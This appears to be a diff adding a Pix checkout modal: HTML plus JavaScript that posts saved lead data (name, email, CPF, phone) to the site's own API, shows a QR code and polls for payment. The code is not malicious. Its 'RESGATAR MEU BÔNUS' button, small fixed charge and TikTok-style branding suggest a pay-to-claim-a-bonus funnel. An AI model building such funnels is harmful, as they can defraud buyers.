+    <div class="pix-handle"></div>
+    <button class="pix-btn-x" onclick="fecharPixModal()">×</button>
+
+    <div class="pix-modal-header">
+      <div class="pix-check-wrap">
+        <div class="pix-check-circle">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#FE2C55" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="20 6 9 17 4 12"/>
+          </svg>
+        </div>
+      </div>
+      <div class="pix-header-title">Pagamento Gerado!</div>
+      <div class="pix-header-date" id="pixHeaderDate">—</div>
+      <div class="pix-header-valor" id="pixHeaderValor">—</div>
+      <div class="pix-timer-row">
+        <span class="pix-timer-label">Tempo restante:</span>
+        <span class="pix-timer-count" id="pixTimerCount">--:--</span>
+      </div>
+    </div>
+
+    <div class="pix-progress-wrap">
+      <div class="pix-progress-fill" id="pixProgressBar"></div>
+    </div>
+
+    <div class="pix-tabs-wrap">
+      <div class="pix-tabs">
+        <button class="pix-tab" id="pixTabCC" onclick="pixTrocarAba('cc')">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+          </svg>
+          Copia e Cola
+        </button>
+        <button class="pix-tab" id="pixTabQR" onclick="pixTrocarAba('qr')">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/>
+            <rect x="3" y="14" width="7" height="7"/><rect x="14" y="14" width="4" height="4"/>
+          </svg>
+          QR Code
+        </button>
+      </div>
+    </div>
+
+    <!-- ABA COPIA E COLA (padrão) -->
+    <div class="pix-tab-content active" id="pix-tab-cc">
+      <ol class="pix-cc-steps">
+        <li class="pix-cc-step"><div class="pix-cc-step-num">1</div><span>Abra o app do seu banco e vá em <strong>Pix</strong></span></li>
+        <li class="pix-cc-step"><div class="pix-cc-step-num">2</div><span>Escolha <strong>Pix Copia e Cola</strong></span></li>
+        <li class="pix-cc-step"><div class="pix-cc-step-num">3</div><span>Clique em <strong>Copiar Código PIX</strong> abaixo e cole no banco</span></li>
+        <li class="pix-cc-step"><div class="pix-cc-step-num">4</div><span>Confira o valor de <strong id="pixCcValor">—</strong> e confirme</span></li>
+      </ol>
+      <div class="pix-code-row">
+        <span class="pix-code-text" id="pixCcCode">aguardando código...</span>
+      </div>
+      <button class="pix-btn-copiar" id="pixBtnCopiarCC" onclick="pixCopiar()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+        </svg>
+        Copiar Código PIX
+      </button>
+    </div>
+
+    <!-- ABA QR CODE -->
+    <div class="pix-tab-content" id="pix-tab-qr">
+      <div class="pix-steps-row">
+        <div class="pix-step-col">
+          <div class="pix-step-icon-wrap">
+            <svg viewBox="0 0 24 24" fill="none" stroke="#FE2C55" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
+          </div>
+          <div class="pix-step-label">Abra seu banco</div>
+        </div>
+        <div class="pix-step-arrow">›</div>
+        <div class="pix-step-col">
+          <div class="pix-step-icon-wrap">
+            <svg viewBox="0 0 24 24" fill="none" stroke="#FE2C55" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/><path d="M8 12h8M12 8v8"/></svg>
+          </div>
+          <div class="pix-step-label">Vá em Pix</div>
+        </div>
+        <div class="pix-step-arrow">›</div>
+        <div class="pix-step-col">
+          <div class="pix-step-icon-wrap">
+            <svg viewBox="0 0 24 24" fill="none" stroke="#FE2C55" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
+          </div>
+          <div class="pix-step-label">Escaneie o QR</div>
+        </div>
+        <div class="pix-step-arrow">›</div>
+        <div class="pix-step-col">
+          <div class="pix-step-icon-wrap">
+            <svg viewBox="0 0 24 24" fill="none" stroke="#FE2C55" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          </div>
+          <div class="pix-step-label">Confirme</div>
+        </div>
+      </div>
+      <div class="pix-qr-outer">
+        <div class="pix-qr-box" id="pixQrBox">
+          <div class="pix-qr-paid-overlay" id="pixQrPaid">
+            <div class="pix-paid-check">
+              <svg viewBox="0 0 24 24" fill="none" stroke="#FE2C55" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+            </div>
+            <p>PAGO!</p>
+          </div>
+        </div>
+      </div>
+      <div class="pix-code-row">
+        <span class="pix-code-text" id="pixQrCode">aguardando código...</span>
+      </div>
+      <button class="pix-btn-copiar" id="pixBtnCopiarQR" onclick="pixCopiar()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+        </svg>
+        Copiar Código PIX
+      </button>
+    </div>
+
+    <div class="pix-status-row" id="pixStatusRow">
+      <div class="pix-mini-spin" id="pixMiniSpin"></div>
+      <span id="pixStatusText">Gerando código Pix...</span>
+    </div>
+    <div style="text-align:center;padding-bottom:8px;">
+      <button class="pix-btn-retry" id="pixBtnRetry" onclick="pixTentarNovamente()">↻ Tentar novamente</button>
+    </div>
+
+    <div class="pix-modal-footer">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#FE2C55" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+      </svg>
+      <span>Pagamento 100% seguro · Tecnologia Pix BCB</span>
+    </div>
+  </div>
+</div>`;
+
+function pixInit() {
+  document.body.insertAdjacentHTML('beforeend', modalHtml);
+
+  // ── Carrega QRCode.js se não estiver ──────────────────────
+  if (typeof QRCode === 'undefined') {
+    const s = document.createElement('script');
+    s.src = 'https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js';
+    document.head.appendChild(s);
+  }
+}
+
+if (document.readyState === 'loading') {
+  document.addEventListener('DOMContentLoaded', pixInit);
+} else {
+  pixInit();
+}
+
+// ── Estado ────────────────────────────────────────────────
+let _pixCode = null, _paymentCode = null, _pollingIv = null, _timerIv = null;
+let TOTAL_SECS = 15 * 60;
+
+function fmt(c) { return (c/100).toLocaleString('pt-BR',{style:'currency',currency:'BRL'}); }
+
+function pixSetStatus(msg, tipo) {
+  document.getElementById('pixMiniSpin').style.display = tipo === '' ? 'block' : 'none';
+  document.getElementById('pixStatusRow').className = 'pix-status-row ' + (tipo||'');
+  document.getElementById('pixStatusText').textContent = msg;
+}
+
+window.pixTrocarAba = function(aba) {
+  ['cc','qr'].forEach(function(a) {
+    document.getElementById('pixTab' + a.toUpperCase()).classList.toggle('active', a === aba);
+    document.getElementById('pix-tab-' + a).classList.toggle('active', a === aba);
+  });
+};
+
+function pixIniciarTimer() {
+  clearInterval(_timerIv);
+  var seg = TOTAL_SECS;
+  var countEl = document.getElementById('pixTimerCount');
+  var barEl   = document.getElementById('pixProgressBar');
+
+  function tick() {
+    if (seg <= 0) {
+      clearInterval(_timerIv);
+      clearInterval(_pollingIv);
+      countEl.textContent = '00:00';
+      countEl.classList.add('urgent');
+      barEl.style.width = '0%';
+      pixSetStatus('Código expirado. Tente novamente.','err');
+      document.getElementById('pixBtnRetry').classList.add('show');
+      return;
+    }
+    var m = Math.floor(seg/60), s = seg%60;
+    countEl.textContent = String(m).padStart(2,'0') + ':' + String(s).padStart(2,'0');
+    if (seg <= 60) countEl.classList.add('urgent');
+    barEl.style.width = (seg/TOTAL_SECS*100) + '%';
+    seg--;
+  }
+  tick(); _timerIv = setInterval(tick, 1000);
+}
+
+function pixRenderQR(code) {
+  var box = document.getElementById('pixQrBox');
+  var div = document.createElement('div');
+  function renderQR() {
+    if (typeof QRCode !== 'undefined') {
+      new QRCode(div, { text: code, width: 160, height: 160, correctLevel: QRCode.CorrectLevel.M });
+      box.insertBefore(div, document.getElementById('pixQrPaid'));
+    } else {
+      setTimeout(renderQR, 200);
+    }
+  }
+  renderQR();
+}
+
+function pixAtivarCodigo(code) {
+  ['pixCcCode','pixQrCode'].forEach(function(id) {
+    var el = document.getElementById(id);
+    el.textContent = code;
+    el.classList.add('ready');
+  });
+  ['pixBtnCopiarCC','pixBtnCopiarQR'].forEach(function(id) {
+    document.getElementById(id).classList.add('ready');
+  });
+}
+
+function pixIniciarPolling(paymentCode) {
+  clearInterval(_pollingIv);
+  _pollingIv = setInterval(function() {
+    fetch('/api/status?f=up8&code=' + encodeURIComponent(paymentCode))
+      .then(function(r) { return r.json(); })
+      .then(function(data) {
+        if (data.status === 'approved') {
+          if (window.ttEvento) window.ttEvento(data.tiktok);   // compra: mesmo evento do servidor, pelo pixel
+          clearInterval(_pollingIv); clearInterval(_timerIv);
+          document.getElementById('pixQrPaid').classList.add('show');
+          document.getElementById('pixProgressBar').style.background = '#00b37e';
+          pixSetStatus('Pagamento confirmado! Redirecionando...','ok');
+          setTimeout(function() {
+            window.location.href = data.obrigado_url + (location.search || "");
+          }, 1800);
+        }
+      })
+      .catch(function() {});
+  }, 5000);
+}
+
+var _criando = false;
+function pixIniciar() {
+  if (_criando) return;   // evita criar duas cobrancas por chamadas repetidas
+  _criando = true;
+  _pixCode = null; _paymentCode = null;
+  clearInterval(_pollingIv); clearInterval(_timerIv);
+
+  // Reseta QR
+  var box = document.getElementById('pixQrBox');
+  box.innerHTML = '<div class="pix-qr-paid-overlay" id="pixQrPaid"><div class="pix-paid-check"><svg viewBox="0 0 24 24" fill="none" stroke="#FE2C55" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div><p>PAGO!</p></div>';
+  ['pixCcCode','pixQrCode'].forEach(function(id) {
+    var el = document.getElementById(id); el.textContent = 'aguardando código...'; el.classList.remove('ready');
+  });
+  ['pixBtnCopiarCC','pixBtnCopiarQR'].forEach(function(id) {
+    document.getElementById(id).classList.remove('ready','copied');
+  });
+  document.getElementById('pixTimerCount').className = 'pix-timer-count';
+  document.getElementById('pixProgressBar').style.width = '100%';
+  document.getElementById('pixBtnRetry').classList.remove('show');
+  pixSetStatus('Gerando código Pix...','');
+
+  // Pega dados do sessionStorage (checkout anterior)
+  var savedLead = {};
+  try { savedLead = JSON.parse(sessionStorage.getItem('lead_data') || '{}'); } catch(e) {}
+  var nome  = savedLead.nome  || 'Cliente';
+  var email = savedLead.email || 'cliente@email.com';
+  var utm   = (new URLSearchParams(window.location.search)).get('utm_source') || '';
+
+  fetch('/api/pix?f=up8', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ nome: nome, email: email, cpf: savedLead.cpf || '', telefone: savedLead.telefone || '', utm: window.location.search.replace(/^\?/, ''), url_full: window.location.href })
+  })
+  .then(function(res) { _criando = false; return res.json(); }, function(e) { _criando = false; throw e; })
+  .then(function(data) {
+    if (data.error || !data.payment_code) {
+      pixSetStatus('Erro ao gerar PIX. Tente novamente.','err');
+      document.getElementById('pixBtnRetry').classList.add('show');
+      return;
+    }
+    if (window.ttEvento) window.ttEvento(data.tiktok);   // "Pix gerado": mesmo evento do servidor, pelo pixel
+    _paymentCode = data.payment_code;
+    _pixCode     = data.pix_code || '';
+    sessionStorage.setItem('duttyfy_pix_data_up8',JSON.stringify({
+      payment_code:_paymentCode,pix_code:_pixCode,
+      price_label:data.price_label||'R$ 19,46',
+      expires_at:Date.now()+(TOTAL_SECS*1000)
+    }));
+    document.getElementById('pixHeaderValor').textContent = data.price_label || 'R$ 19,46';
+    document.getElementById('pixCcValor').textContent     = data.price_label || 'R$ 19,46';
+    pixRenderQR(_pixCode);
+    pixAtivarCodigo(_pixCode);
+    pixSetStatus('Aguardando pagamento...','');
+    pixIniciarTimer();
+    pixIniciarPolling(_paymentCode);
+  })
+  .catch(function() {
+    pixSetStatus('Erro de conexão. Tente novamente.','err');
+    document.getElementById('pixBtnRetry').classList.add('show');
+  });
+}
+
+window.pixTentarNovamente = function() {
+  document.getElementById('pixBtnRetry').classList.remove('show');
+  pixIniciar();
+};
+
+window.pixCopiar = function() {
+  if (!_pixCode) return;
+  navigator.clipboard.writeText(_pixCode).then(function() {
+    ['pixBtnCopiarCC','pixBtnCopiarQR'].forEach(function(id) {
+      var btn = document.getElementById(id);
+      var prev = btn.innerHTML;
+      btn.innerHTML = '✓ Copiado!';
+      btn.classList.add('copied');
+      setTimeout(function() { btn.innerHTML = prev; btn.classList.remove('copied'); btn.classList.add('ready'); }, 2500);
+    });
+  });
+};
+
+window.abrirPixModal = function() {
+  var overlay = document.getElementById('pixOverlay');
+  overlay.classList.add('active');
+  document.body.style.overflow = 'hidden';
+  pixTrocarAba('cc');
+  var saved=sessionStorage.getItem('duttyfy_pix_data_up8');
+  if(saved){try{var s=JSON.parse(saved);
+    if(s.expires_at&&Date.now()<s.expires_at){
+      _pixCode=s.pix_code;_paymentCode=s.payment_code;
+      document.getElementById('pixHeaderDate').textContent='Expira em: '+new Date(s.expires_at).toLocaleString('pt-BR');
+      document.getElementById('pixHeaderValor').textContent=s.price_label||'R$ 19,46';
+      document.getElementById('pixCcValor').textContent=s.price_label||'R$ 19,46';
+      pixAtivarCodigo(_pixCode);pixRenderQR(_pixCode);
+      var rem=Math.floor((s.expires_at-Date.now())/1000);
+      TOTAL_SECS=rem>0?rem:900;
+      pixSetStatus('Aguardando pagamento...','');
+      pixIniciarTimer();pixIniciarPolling(_paymentCode);
+      return;
+    }
+  }catch(e){}sessionStorage.removeItem('duttyfy_pix_data_up8');}
+  document.getElementById('pixHeaderDate').textContent = 'Expira em: ' + new Date(Date.now() + TOTAL_SECS*1000).toLocaleString('pt-BR');
+  pixIniciar();
+};
+
+window.fecharPixModal = function() {
+  clearInterval(_pollingIv); clearInterval(_timerIv);
+  document.getElementById('pixOverlay').classList.remove('active');
+  document.body.style.overflow = '';
+  var btn=document.getElementById('btnPagar');
+  if(btn){btn.classList.remove('loading');btn.disabled=false;var t=btn.querySelector('.btn-text');if(t)t.textContent='RESGATAR MEU BÔNUS';}
+};
+
+document.addEventListener('keydown', function(e) { if (e.key === 'Escape') fecharPixModal(); });
+
+})();
+</script>
+
+</body>
